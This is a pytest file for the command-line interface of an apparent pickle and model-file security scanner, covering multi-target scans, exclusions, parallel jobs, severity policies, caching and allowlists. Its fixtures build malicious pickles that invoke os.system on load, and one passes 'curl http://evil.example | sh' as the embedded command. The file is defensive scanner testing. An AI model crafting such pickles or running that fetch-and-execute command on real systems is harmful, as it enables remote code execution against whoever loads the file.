"""CLI tests for the HW-146 directory-scan ergonomics (several targets,
--exclude, --max-size, --jobs) and the HW-153 wiring (--policy, --cache).

Everything runs through cli.main(argv) returning the exit code, with capsys
splitting stdout (the report) from stderr (progress and audit lines). The
pickle fixtures reuse the _os_system_pickle shape from tests/test_cli_features.

The --jobs tests spin up a real ProcessPoolExecutor. Under the spawn start
method the workers re-import this test module, so the helpers live at module
scope and stay importable.
"""

from __future__ import annotations

import json

from hayward import cli


def _short_binunicode(text: str) -> bytes:
    raw = text.encode()
    return bytes([0x8C, len(raw)]) + raw


def _os_system_pickle(command: str) -> bytes:
    """A standalone protocol-4 pickle calling os.system(command)."""
    return (
        b"\x80\x04"
        + _short_binunicode("os")
        + _short_binunicode("system")
        + b"\x93"
        + _short_binunicode(command)
        + b"\x85"
        + b"R."
    )


def _evil(directory, name="evil.pkl", command="id"):
    target = directory / name
    target.write_bytes(_os_system_pickle(command))
    return target


def _benign(directory, name="benign.pkl"):
    # An empty-dict pickle: a real, parseable stream with no unsafe global.
    target = directory / name
    target.write_bytes(b"\x80\x04}\x94.")
    return target


class TestMultipleTargets:
    def test_findings_from_every_target_are_aggregated(self, tmp_path, capsys):
        a = tmp_path / "a"
        b = tmp_path / "b"
        a.mkdir()
        b.mkdir()
        _evil(a, "one.pkl", command="id")
        _evil(b, "two.pkl", command="whoami")
        rc = cli.main(["scan", str(a), str(b), "-f", "json", "--fail-on", "never"])
        assert rc == 0
        data = json.loads(capsys.readouterr().out)
        files = {f["file"] for f in data["findings"]}
        assert str(a / "one.pkl") in files
        assert str(b / "two.pkl") in files

    def test_a_missing_target_is_a_usage_error(self, tmp_path, capsys):
        evil = _evil(tmp_path)
        rc = cli.main(["scan", str(evil), str(tmp_path / "nope")])
        assert rc == 2
        assert "no such file or directory" in capsys.readouterr().err


class TestExclude:
    def test_excluded_malicious_file_is_skipped(self, tmp_path, capsys):
        _evil(tmp_path, "evil.pkl")
        rc = cli.main([
            "scan", str(tmp_path), "--exclude", "evil.pkl", "--fail-on", "high",
            "-f", "json",
        ])
        # The only malicious file was excluded, so nothing fires.
        assert rc == 0
        data = json.loads(capsys.readouterr().out)
        assert data["findings"] == []

    def test_a_non_matching_exclude_leaves_the_finding(self, tmp_path):
        _evil(tmp_path, "evil.pkl")
        rc = cli.main([
            "scan", str(tmp_path), "--exclude", "*.safetensors", "--fail-on", "high",
        ])
        assert rc == 1


class TestMaxSize:
    def test_zero_is_rejected(self, tmp_path, capsys):
        evil = _evil(tmp_path)
        rc = cli.main(["scan", str(evil), "--max-size", "0"])
        assert rc == 2
        assert "max-size" in capsys.readouterr().err

    def test_negative_is_rejected(self, tmp_path):
        evil = _evil(tmp_path)
        assert cli.main(["scan", str(evil), "--max-size", "-5"]) == 2

    def test_a_human_suffix_parses_and_the_scan_runs(self, tmp_path, capsys):
        evil = _evil(tmp_path)
        rc = cli.main(["scan", str(evil), "--max-size", "200M", "-f", "json",
                       "--fail-on", "never"])
        assert rc == 0
        data = json.loads(capsys.readouterr().out)
        assert any(f["rule_id"] == "MFV-PICKLE-001" for f in data["findings"])


class TestJobs:
    def test_parallel_scan_matches_sequential(self, tmp_path, capsys):
        # A mix of malicious and benign files across a nested tree.
        sub = tmp_path / "sub"
        sub.mkdir()
        _evil(tmp_path, "a.pkl", command="id")
        _evil(tmp_path, "b.pkl", command="whoami")
        _evil(sub, "c.pkl", command="curl http://evil.example | sh")
        _benign(tmp_path, "d.pkl")
        _benign(sub, "e.pkl")

        def scan(jobs):
            rc = cli.main(["scan", str(tmp_path), "-f", "json",
                           "--fail-on", "high", "--jobs", str(jobs)])
            out = json.loads(capsys.readouterr().out)
            keys = sorted((f["rule_id"], f["file"]) for f in out["findings"])
            return rc, keys

        rc1, keys1 = scan(1)
        rc2, keys2 = scan(2)
        # Identical exit code and identical finding set: no file dropped or
        # double-counted, and the worker config produced the same verdicts.
        assert rc1 == rc2 == 1
        assert keys1 == keys2
        assert len(keys1) == 3


class TestProgressStreams:
    def test_progress_goes_to_stderr_not_stdout(self, tmp_path, capsys):
        _evil(tmp_path, "evil.pkl")
        rc = cli.main(["scan", str(tmp_path), "--progress", "-f", "json",
                       "--fail-on", "never"])
        assert rc == 0
        captured = capsys.readouterr()
        # The counter is on stderr; stdout is a clean JSON report.
        assert "scanned" in captured.err
        assert "/" in captured.err
        assert "scanned" not in captured.out
        json.loads(captured.out)  # stdout parses as JSON, uncontaminated


class TestPolicy:
    def _policy(self, tmp_path, overrides, name="policy.json"):
        path = tmp_path / name
        path.write_text(json.dumps({"severity_overrides": overrides}))
        return path

    def test_downgrade_lets_a_scan_pass_the_gate(self, tmp_path):
        evil = _evil(tmp_path)
        # Without a policy this critical finding fails --fail-on high.
        assert cli.main(["scan", str(evil), "--fail-on", "high"]) == 1
        policy = self._policy(tmp_path, {"MFV-PICKLE-001": "low"})
        rc = cli.main(["scan", str(evil), "--policy", str(policy),
                       "--fail-on", "high"])
        assert rc == 0

    def test_an_unknown_severity_is_a_usage_error(self, tmp_path, capsys):
        evil = _evil(tmp_path)
        bad = self._policy(tmp_path, {"MFV-PICKLE-001": "criticl"})
        rc = cli.main(["scan", str(evil), "--policy", str(bad)])
        assert rc == 2
        assert "policy" in capsys.readouterr().err


class TestCache:
    def test_a_poisoned_entry_is_trusted_on_the_second_run(self, tmp_path):
        evil = _evil(tmp_path, "evil.pkl")
        cache = tmp_path / "cache.json"
        # First run populates the cache (and would fail the gate).
        assert cli.main(["scan", str(evil), "--cache", str(cache),
                         "--fail-on", "never"]) == 0
        assert cache.exists()
        # Poison every entry to a clean verdict. If the second run trusts the
        # cache (a content hit) rather than re-reading the file, the now-empty
        # findings mean the gate passes: proof the file was not re-scanned.
        document = json.loads(cache.read_text())
        document["entries"] = {digest: [] for digest in document["entries"]}
        cache.write_text(json.dumps(document))
        rc = cli.main(["scan", str(evil), "--cache", str(cache),
                       "--fail-on", "high"])
        assert rc == 0

    def test_cache_hit_holds_under_parallel_jobs(self, tmp_path):
        _evil(tmp_path, "a.pkl", command="id")
        _evil(tmp_path, "b.pkl", command="whoami")
        cache = tmp_path / "cache.json"
        assert cli.main(["scan", str(tmp_path), "--cache", str(cache),
                         "--fail-on", "never"]) == 0
        document = json.loads(cache.read_text())
        document["entries"] = {digest: [] for digest in document["entries"]}
        cache.write_text(json.dumps(document))
        # --jobs>1 must partition hits in the main process and never re-scan
        # them, so the poisoned-clean cache still wins.
        rc = cli.main(["scan", str(tmp_path), "--cache", str(cache),
                       "--fail-on", "high", "--jobs", "2"])
        assert rc == 0


class TestComposition:
    def _baseline(self, tmp_path, target, name="base.json"):
        out = tmp_path / name
        cli.main(["scan", str(target), "-f", "json", "-o", str(out),
                  "--fail-on", "never"])
        return out

    def test_policy_then_allowlist_then_baseline_compose(self, tmp_path, capsys):
        import hashlib

        models = tmp_path / "models"
        models.mkdir()
        evil = _evil(models, "evil.pkl")
        blob = evil.read_bytes()
        base = self._baseline(tmp_path, models)

        # Policy downgrades critical -> low; the allowlist (matched by rule id,
        # which policy does not change) then suppresses the finding entirely.
        policy = tmp_path / "policy.json"
        policy.write_text(json.dumps(
            {"severity_overrides": {"MFV-PICKLE-001": "low"}}))
        allow = tmp_path / "allow.json"
        allow.write_text(json.dumps([{
            "sha256": hashlib.sha256(blob).hexdigest(),
            "rule_id": "MFV-PICKLE-001",
            "justification": "reviewed, benign",
            "approved_by": "ken",
        }]))

        rc = cli.main([
            "scan", str(models), "--policy", str(policy),
            "--allowlist", str(allow), "--baseline", str(base),
            "--fail-on", "low",
        ])
        captured = capsys.readouterr()
        assert rc == 0
        # All three stages ran: the allowlist announced its suppression and the
        # baseline printed its delta line.
        assert "suppressed MFV-PICKLE-001" in captured.err
        assert "baseline:" in captured.err
